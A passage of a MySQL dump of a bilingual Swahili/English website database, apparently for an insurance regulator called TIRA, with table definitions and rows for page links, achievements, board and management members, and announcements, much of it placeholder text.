-- MySQL dump 10.14  Distrib 5.5.68-MariaDB, for Linux (x86_64)
--
-- Host: localhost    Database: c1tiradb
-- ------------------------------------------------------
-- Server version	5.5.68-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `about_links`
--

DROP TABLE IF EXISTS `about_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `about_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT '0',
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `about_links`
--

LOCK TABLES `about_links` WRITE;
/*!40000 ALTER TABLE `about_links` DISABLE KEYS */;
INSERT INTO `about_links` VALUES (1,'TIRA Establishment','TIRA Establishment',1,'pages/tira-establishment',NULL,1,0,1,'2022-02-22 10:19:16','2022-08-10 14:15:44'),(2,'Mission and Vision','Mission and Vision',1,'pages/mission-and-vision',NULL,1,0,1,'2022-02-22 10:19:36','2022-08-10 14:16:10'),(3,'Objectives and Functions','Objectives and Functions',1,'pages/our-objectives',NULL,1,0,1,'2022-08-10 14:17:18','2022-08-10 14:17:18'),(4,'Organization Structure','Organization Structure',1,'pages/organization-structure',NULL,1,0,1,'2022-08-10 14:17:41','2022-08-10 14:18:13');
/*!40000 ALTER TABLE `about_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `achievements`
--

DROP TABLE IF EXISTS `achievements`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `achievements` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `icon` text COLLATE utf8mb4_unicode_ci,
  `color` text COLLATE utf8mb4_unicode_ci,
  `specials` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `achievements`
--

LOCK TABLES `achievements` WRITE;
/*!40000 ALTER TABLE `achievements` DISABLE KEYS */;
INSERT INTO `achievements` VALUES (1,'Real Possibilities on Enhancement of the Achievable Estimates','Real Possibilities on Enhancement of the Achievable Estimates',NULL,NULL,'<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','5d98d83f16201818172542dd6bc9ba14.jpeg',1,'real-possibilities-on-enhancement-of-the-achievable-estimates','2021-08-02 04:59:37','2022-06-30 17:18:35',0,'icon-1646651310',NULL,NULL),(2,'Real Possibilities on Enhancement of the Achievable Estimates','Real Possibilities on Enhancement of the Achievable Estimates',NULL,NULL,'<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','19c85af6feaf700d95b0653f677ebdf9.jpeg',0,'real-possibilities-on-enhancement-of-the-achievable-estimates-2','2021-08-02 05:00:05','2022-03-07 08:08:06',0,'icon-1646651286',NULL,NULL),(3,'Real Possibilities on Enhancement of the Achievable Estimates','Real Possibilities on Enhancement of the Achievable Estimates',NULL,NULL,'<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','70d612c847bc081f67c2abb6dbf83043.jpeg',1,'real-possibilities-on-enhancement-of-the-achievable-estimates-3','2021-08-02 05:03:54','2022-06-30 17:15:34',0,'icon-1646651268',NULL,NULL),(6,'Lorem ipsum dolor sit amet consectetur adipisicing elit.','Lorem ipsum dolor sit amet consectetur adipisicing elit.',NULL,NULL,'<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>','<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>','36ea13cd32bb5e75aaaf4fdee5ffd27f.jpeg',1,'lorem-ipsum-dolor-sit-amet-consectetur-adipisicing-elit','2022-06-30 17:08:49','2022-06-30 17:08:49',0,NULL,NULL,NULL);
/*!40000 ALTER TABLE `achievements` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `activity_log`
--

DROP TABLE IF EXISTS `activity_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `activity_log` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `log_name` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `subject_id` int(11) DEFAULT NULL,
  `subject_type` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `causer_id` int(11) DEFAULT NULL,
  `causer_type` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `properties` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `activity_log_log_name_index` (`log_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `activity_log`
--

LOCK TABLES `activity_log` WRITE;
/*!40000 ALTER TABLE `activity_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `activity_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `administration_categories`
--

DROP TABLE IF EXISTS `administration_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `administration_categories` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `featured` tinyint(4) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `administration_categories`
--

LOCK TABLES `administration_categories` WRITE;
/*!40000 ALTER TABLE `administration_categories` DISABLE KEYS */;
INSERT INTO `administration_categories` VALUES (1,'Bodi ya Wakurugenzi','Board Members','Hii ni Bodi ya Wakuregenzi.\r\n\r\nLorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\'s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.','This is the Board Members.\r\n\r\nLorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\'s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.',1,'board-members',NULL,1,'2021-08-09 12:32:20','2022-08-10 17:35:29'),(2,'Management Team','Management Team',NULL,NULL,0,'management-team',NULL,1,'2021-10-08 08:50:02','2021-10-08 08:50:02'),(3,'Commissioner of Insurance','Commissioner of Insurance','Commissioner of Insurance','Commissioner of Insurance',0,'commissioner-of-insurance',NULL,1,'2022-08-12 08:29:05','2022-08-12 09:08:20');
/*!40000 ALTER TABLE `administration_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `administration_categories_members`
--

DROP TABLE IF EXISTS `administration_categories_members`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `administration_categories_members` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `category_id` int(11) NOT NULL,
  `member_id` int(11) NOT NULL,
  `title_en` varchar(64) DEFAULT NULL,
  `title_sw` varchar(64) DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `administration_categories_members`
--

LOCK TABLES `administration_categories_members` WRITE;
/*!40000 ALTER TABLE `administration_categories_members` DISABLE KEYS */;
INSERT INTO `administration_categories_members` VALUES (13,1,14,'Commissioner of Insurance','Commissioner of Insurance',0,1,'2022-08-13 18:07:40','2022-08-13 18:07:40'),(14,1,15,'Deputy Commissioner  of Insurance','Deputy Commissioner  of Insurance',0,2,'2022-08-13 18:09:49','2022-08-13 18:09:49'),(15,1,16,'Director of Human Resource Management and Administrative','Director of Human Resource Management and Administrative',0,3,'2022-08-13 18:18:00','2022-08-13 18:18:00'),(16,1,18,'Director of Supervision','Director of Supervision',0,4,'2022-08-13 18:27:04','2022-08-13 18:27:04'),(17,1,17,'Director of Market Developent and Research. ','Director of Market Developent and Research. ',0,5,'2022-08-13 18:38:36','2022-08-13 18:38:36'),(18,1,19,'Ag.Director of Legal Enforcement','Ag.Director of Legal Enforcement',0,6,'2022-08-13 18:41:10','2022-08-13 18:41:10'),(19,1,20,'Director of Finance','Director of Finance',0,7,'2022-08-13 18:42:43','2022-08-13 18:42:43');
/*!40000 ALTER TABLE `administration_categories_members` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `administration_members`
--

DROP TABLE IF EXISTS `administration_members`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `administration_members` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `salutation_en` text COLLATE utf8mb4_unicode_ci,
  `salutation_sw` text COLLATE utf8mb4_unicode_ci,
  `fullname` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `position` int(11) NOT NULL DEFAULT '0',
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` text COLLATE utf8mb4_unicode_ci,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `slug` text COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `administration_members`
--

LOCK TABLES `administration_members` WRITE;
/*!40000 ALTER TABLE `administration_members` DISABLE KEYS */;
INSERT INTO `administration_members` VALUES (14,'Dr. Baghayo A. Saqware','Dr. Baghayo A. Saqware','Dr. Baghayo A. Saqware',0,'Commissioner of Insurance','Commissioner of Insurance',NULL,NULL,'696b379afa76d8d406d969dd5b70868f.jpeg',NULL,NULL,'2022-08-12 10:28:40','2022-08-12 10:28:40','dr-baghayo-a-saqware'),(15,'Mrs','Mrs','Khadija Said',1,'Deputy Commissioner  of Insurance','Deputy Commissioner  of Insurance',NULL,NULL,'86d6524abeab5fb5224b0297bee5fbbf.jpeg',NULL,NULL,'2022-08-12 10:47:36','2022-08-12 10:47:36','khadija-said'),(16,'Mrs','Mrs','H. Mniga ',0,'Director of Human Resource Management and Administrative','Director of Human Resource Management and Administrative',NULL,NULL,'b624dd825249d997924bcff3129374e6.jpeg',NULL,NULL,'2022-08-13 18:16:15','2022-08-13 18:16:15','h-mniga'),(17,'Mr.','Mr.','Mwiru   ',0,'Director of Market Developent and Research. ','Director of Market Developent and Research. ',NULL,NULL,'ba8c6b78504abf67cc68f20b3f78c792.jpeg',NULL,NULL,'2022-08-13 18:23:06','2022-08-13 18:37:16','mr-mwiru'),(18,'Mr.','Mr.','A. Ndwata',0,'Director of Supervision','Director of Supervision','<p><span style=\"font-size:11pt\"><span style=\"font-family:Calibri,sans-serif\"><span style=\"font-size:10.5pt\"><span style=\"background-color:white\"><span style=\"font-family:&quot;Arial&quot;,sans-serif\"><span style=\"color:#333333\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></span></span></span></span></span></p>',NULL,'e52f38e8f8b71f6426233fe40e364c56.jpeg',NULL,NULL,'2022-08-13 18:25:58','2022-08-13 18:25:58','a-ndwata'),(19,'Mr.','Mr.','E. Kiria  ',0,'Ag. Director Legal Enforcement   ','Ag. Director Legal Enforcement   ','<p style=\"text-align:justify\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>',NULL,'06a738e732bc4bb9442ec648b6b72e49.jpeg',NULL,NULL,'2022-08-13 18:30:08','2022-08-13 18:30:08','e-kiria'),(20,'Mr.','Mr.','Gambamala',0,'Director of Finance','Director of Finance',NULL,NULL,'c5e35260c6ebf98213126b0bd1725982.jpeg',NULL,NULL,'2022-08-13 18:32:41','2022-08-13 18:32:41','gambamala');
/*!40000 ALTER TABLE `administration_members` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `announcements`
--

DROP TABLE IF EXISTS `announcements`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `announcements` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `start_date` date DEFAULT NULL,
  `end_date` date DEFAULT NULL,
  `location` text COLLATE utf8mb4_unicode_ci,
  `file_en` text COLLATE utf8mb4_unicode_ci,
  `file_sw` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `announcements`
--

LOCK TABLES `announcements` WRITE;
/*!40000 ALTER TABLE `announcements` DISABLE KEYS */;
INSERT INTO `announcements` VALUES (1,'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC','Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;</p>','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;</p>',NULL,NULL,NULL,NULL,NULL,1,'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc','2021-11-01 03:44:12','2021-11-01 03:44:12'),(2,'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ','Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>',NULL,NULL,NULL,NULL,NULL,1,'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-2','2021-11-17 03:44:12','2021-11-17 03:44:12'),(3,'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ','Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>',NULL,NULL,NULL,NULL,NULL,1,'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-3','2021-11-20 03:44:12','2021-11-20 03:44:12'),(4,'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ','Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>',NULL,NULL,NULL,NULL,NULL,1,'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-4','2021-11-23 03:44:12','2021-11-23 03:44:12'),(5,'Lorem Ipsum is simply dummy text of the printing and typesetting industry','Lorem Ipsum is simply dummy text of the printing and typesetting industry','<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. 